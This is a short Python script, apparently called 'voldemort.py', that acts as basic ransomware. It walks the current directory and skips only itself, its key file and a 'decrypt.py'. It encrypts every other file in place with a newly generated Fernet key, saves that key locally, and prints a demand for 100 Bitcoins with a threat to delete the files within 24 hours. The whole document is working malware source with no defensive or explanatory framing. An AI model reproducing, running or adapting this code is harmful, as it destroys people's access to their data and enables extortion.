import os
from cryptography.fernet import Fernet
files=[]
for file in os.listdir():
       if file == "voldemort.py" or file == "thekey.key" or file == "decrypt.py":
           continue
       if os.path.isfile(file):
           files.append(file)
print(files)

key = Fernet.generate_key()

with open("thekey.key","wb") as thekey:
      thekey.write(key)

for file in files:
      with open(file, "rb") as thefile:
            contents = thefile.read()
      encrypted_file = Fernet(key).encrypt(contents)
      
      with open(file , "wb") as thefile:
            thefile.write(encrypted_file)      
print("All of your files have been ENCRYPTED!!,Send me 100 Bitcoins or I'll delete your file in 24 hours")  
